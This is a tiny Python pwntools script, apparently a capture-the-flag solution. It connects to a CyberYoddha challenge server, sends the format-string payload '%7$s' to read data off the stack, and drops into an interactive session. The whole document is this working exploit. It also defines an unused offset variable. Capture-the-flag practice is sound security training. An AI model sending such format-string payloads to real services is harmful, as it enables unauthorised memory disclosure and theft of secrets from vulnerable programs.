from pwn import *
offset = 0x10
payload = "%7$s"
r = remote("cyberyoddha.baycyber.net",10005)
r.send(payload)
r.interactive()
